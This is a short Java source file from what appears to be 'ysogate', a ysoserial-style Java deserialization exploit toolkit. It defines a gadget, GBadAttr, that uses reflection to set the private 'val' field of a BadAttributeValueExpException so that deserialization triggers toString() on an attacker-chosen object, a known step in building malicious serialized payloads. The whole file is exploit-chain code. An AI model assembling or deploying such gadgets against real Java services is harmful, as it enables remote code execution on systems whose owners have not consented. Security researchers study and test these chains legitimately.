package com.h2tg.ysogate.bullet.jdk;

import com.h2tg.ysogate.bullet.base.IReadObject2ToString;

import javax.management.BadAttributeValueExpException;

import static com.h2tg.ysogate.utils.Reflections.setFieldValue;

public class GBadAttr implements IReadObject2ToString
{
    @Override
    public Object readObjectToString(Object obj) throws Exception
    {
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        setFieldValue(badAttributeValueExpException, "val", obj);
        return badAttributeValueExpException;
    }
}
